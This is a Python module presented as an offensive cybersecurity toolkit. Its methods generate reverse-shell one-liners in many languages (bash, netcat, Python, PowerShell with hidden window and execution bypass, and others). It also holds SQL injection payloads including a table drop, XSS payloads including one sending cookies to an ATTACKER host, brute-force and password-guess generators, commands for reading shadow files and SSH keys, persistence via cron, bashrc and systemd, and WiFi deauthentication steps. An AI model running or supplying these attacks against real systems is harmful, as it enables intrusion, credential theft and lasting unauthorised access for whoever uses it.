"""
Ahmad Death — Cybersecurity Module
Attack, Defense, Exploit, Red Team, Blue Team
"""

import subprocess
import os
import socket
import json
import base64
import hashlib
import urllib.request
from pathlib import Path
from datetime import datetime


class CyberSec:
    def __init__(self):
        self.session_log = []

    # ── Hash Cracking ─────────────────────────────────────────────────────────
    def identify_hash(self, hash_str: str) -> str:
        """Identify hash type by length and pattern."""
        length = len(hash_str)
        types = {
            32: "MD5",
            40: "SHA1",
            56: "SHA224",
            64: "SHA256 or SHA3-256",
            96: "SHA384",
            128: "SHA512 or SHA3-512",
        }
        if hash_str.startswith("$2b$") or hash_str.startswith("$2a$"):
            return "bcrypt"
        if hash_str.startswith("$6$"):
            return "SHA512crypt (Linux shadow)"
        if hash_str.startswith("$1$"):
            return "MD5crypt"
        return types.get(length, f"Unknown (length {length})")

    def hash_string(self, text: str, algo: str = "sha256") -> str:
        """Hash a string."""
        algos = {
            "md5": hashlib.md5,
            "sha1": hashlib.sha1,
            "sha256": hashlib.sha256,
            "sha512": hashlib.sha512,
        }
        fn = algos.get(algo.lower(), hashlib.sha256)
        return fn(text.encode()).hexdigest()

    def hashcat_command(self, hash_file: str, wordlist: str, hash_type: int = 0, mode: str = "") -> str:
        """Generate hashcat command."""
        cmd = f"hashcat -m {hash_type} {hash_file} {wordlist}"
        if mode:
            cmd += f" {mode}"
        return cmd

    # ── Encoding/Decoding ─────────────────────────────────────────────────────
    def base64_encode(self, text: str) -> str:
        return base64.b64encode(text.encode()).decode()

    def base64_decode(self, encoded: str) -> str:
        try:
            return base64.b64decode(encoded).decode("utf-8", errors="replace")
        except Exception as e:
            return f"[ERROR] {e}"

    def rot13(self, text: str) -> str:
        result = ""
        for c in text:
            if 'a' <= c <= 'z':
                result += chr((ord(c) - ord('a') + 13) % 26 + ord('a'))
            elif 'A' <= c <= 'Z':
                result += chr((ord(c) - ord('A') + 13) % 26 + ord('A'))
            else:
                result += c
        return result

    def xor_encrypt(self, text: str, key: str) -> bytes:
        """XOR encryption."""
        key_bytes = key.encode()
        text_bytes = text.encode()
        return bytes([text_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(text_bytes))])

    # ── Reverse Shell Generator ───────────────────────────────────────────────
    def reverse_shells(self, lhost: str, lport: int) -> dict:
        """Generate reverse shell one-liners for various languages."""
        return {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "bash_196": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            "nc": f"nc -e /bin/bash {lhost} {lport}",
            "nc_no_e": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python2": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            "golang": f'package main;import("net";_ "os/exec";_ "os");func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}")}}',
            "awk": f"awk 'BEGIN{{s=\"/inet/tcp/0/{lhost}/{lport}\";while(42){{do{{printf \"shell>\" |&s;s |& getline c;if(c){{while((c |& getline)>0)print |&s;close(c)}}}}while(c!=\"exit\")close(s)}}' /dev/stdin",
            "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/sh",
        }

    def start_listener(self, port: int) -> str:
        """Command to start netcat listener."""
        return f"nc -lvnp {port}"

    # ── SQL Injection ─────────────────────────────────────────────────────────
    def sql_payloads(self) -> dict:
        """Common SQL injection payloads."""
        return {
            "error_based": ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "admin'--", "' OR 1=1--"],
            "union_based": ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT 1,2,3--"],
            "blind_time": ["'; WAITFOR DELAY '0:0:5'--", "'; SELECT SLEEP(5)--", "' AND SLEEP(5)--"],
            "blind_bool": ["' AND 1=1--", "' AND 1=2--", "' AND (SELECT 1 FROM users LIMIT 1)=1--"],
            "stacked": ["'; DROP TABLE users--", "'; INSERT INTO users VALUES('hack','hack')--"],
            "mysql_info": ["' UNION SELECT table_name FROM information_schema.tables--", "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"],
        }

    def sqlmap_command(self, url: str, data: str = "", flags: str = "--dbs --batch") -> str:
        """Generate sqlmap command."""
        cmd = f"sqlmap -u '{url}'"
        if data:
            cmd += f" --data='{data}'"
        cmd += f" {flags}"
        return cmd

    # ── XSS Payloads ──────────────────────────────────────────────────────────
    def xss_payloads(self) -> list:
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<iframe src=\"javascript:alert(1)\">",
            "<details open ontoggle=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<%2Fscript><%73cript>alert(1)<%2F%73cript>",
            "<script>fetch('http://ATTACKER/?c='+document.cookie)</script>",
        ]

    # ── Password Attacks ──────────────────────────────────────────────────────
    def hydra_command(self, target: str, service: str, user: str, wordlist: str) -> str:
        """Generate Hydra brute force command."""
        return f"hydra -l {user} -P {wordlist} {target} {service} -t 4 -V"

    def generate_wordlist_hints(self, name: str = "", year: str = "2024") -> list:
        """Generate targeted password candidates."""
        candidates = [
            name, name.lower(), name.upper(), name.capitalize(),
            f"{name}{year}", f"{name}123", f"{name}!",
            f"{name}@{year}", f"{name}1234", f"1234{name}",
            f"{name}2023", f"{name}2024", f"{name}2025", f"{name}2026",
            f"{name}password", f"password{name}", "admin", "password",
            "123456", "qwerty", "letmein", "welcome",
        ]
        return [c for c in candidates if c]

    # ── Privilege Escalation ──────────────────────────────────────────────────
    def linux_privesc_checklist(self) -> list:
        """Linux privilege escalation checks."""
        return [
            {"check": "Sudo rights", "cmd": "sudo -l"},
            {"check": "SUID binaries", "cmd": "find / -perm -4000 -type f 2>/dev/null"},
            {"check": "GUID binaries", "cmd": "find / -perm -2000 -type f 2>/dev/null"},
            {"check": "World-writable files", "cmd": "find / -perm -o+w -type f 2>/dev/null | grep -v /proc"},
            {"check": "Cron jobs", "cmd": "cat /etc/crontab; ls -la /etc/cron*"},
            {"check": "Running processes", "cmd": "ps aux"},
            {"check": "Network services", "cmd": "ss -tulnp"},
            {"check": "Kernel version", "cmd": "uname -a"},
            {"check": "OS version", "cmd": "cat /etc/os-release"},
            {"check": "/etc/passwd readable", "cmd": "cat /etc/passwd"},
            {"check": "/etc/shadow readable", "cmd": "cat /etc/shadow 2>/dev/null"},
            {"check": "SSH keys", "cmd": "find / -name id_rsa 2>/dev/null; find / -name authorized_keys 2>/dev/null"},
            {"check": "ENV variables", "cmd": "env"},
            {"check": "Bash history", "cmd": "cat ~/.bash_history"},
            {"check": "Capabilities", "cmd": "getcap -r / 2>/dev/null"},
            {"check": "Writable /etc/passwd", "cmd": "ls -la /etc/passwd"},
            {"check": "Docker/LXC", "cmd": "cat /proc/1/cgroup 2>/dev/null"},
        ]

    def windows_privesc_checklist(self) -> list:
        """Windows privilege escalation checks."""
        return [
            {"check": "Whoami + privileges", "cmd": "whoami /all"},
            {"check": "System info", "cmd": "systeminfo"},
            {"check": "Local users", "cmd": "net user"},
            {"check": "Local groups", "cmd": "net localgroup administrators"},
            {"check": "Running services", "cmd": "sc query state= all"},
            {"check": "Unquoted service paths", "cmd": 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"'},
            {"check": "AlwaysInstallElevated", "cmd": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"},
            {"check": "Stored credentials", "cmd": "cmdkey /list"},
            {"check": "Scheduled tasks", "cmd": "schtasks /query /fo LIST /v"},
            {"check": "Firewall rules", "cmd": "netsh advfirewall show allprofiles"},
            {"check": "Network shares", "cmd": "net share"},
            {"check": "Open connections", "cmd": "netstat -ano"},
        ]

    # ── Web Recon ─────────────────────────────────────────────────────────────
    def dirbusting_commands(self, target: str) -> dict:
        """Directory brute force commands."""
        return {
            "gobuster": f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 50",
            "ffuf": f"ffuf -u {target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50",
            "dirsearch": f"dirsearch -u {target} -t 50",
            "feroxbuster": f"feroxbuster --url {target} --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt",
        }

    # ── Persistence ───────────────────────────────────────────────────────────
    def linux_persistence_methods(self, payload: str) -> dict:
        """Linux persistence mechanisms."""
        return {
            "crontab": f"(crontab -l 2>/dev/null; echo '*/5 * * * * {payload}') | crontab -",
            "bashrc": f"echo '{payload}' >> ~/.bashrc",
            "profile": f"echo '{payload}' >> ~/.profile",
            "systemd_service": f"""[Unit]
Description=System Service
[Service]
ExecStart={payload}
Restart=always
[Install]
WantedBy=multi-user.target""",
            "rc_local": f"echo '{payload}' >> /etc/rc.local",
            "ssh_authorized": "cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys",
        }

    # ── WiFi Attacks ──────────────────────────────────────────────────────────
    def wifi_attack_steps(self, interface: str = "wlan0") -> list:
        """WiFi attack procedure."""
        return [
            f"1. Enable monitor mode: sudo airmon-ng start {interface}",
            f"2. Scan networks: sudo airodump-ng {interface}mon",
            f"3. Capture handshake: sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture {interface}mon",
            f"4. Deauth client: sudo aireplay-ng --deauth 10 -a [BSSID] {interface}mon",
            f"5. Crack with hashcat: hashcat -m 22000 capture.hccapx wordlist.txt",
            f"6. Or John: john --wordlist=wordlist.txt capture.hccapx",
        ]

    def session_log_entry(self, action: str, details: str):
        self.session_log.append({
            "time": datetime.now().isoformat(),
            "action": action,
            "details": details
        })
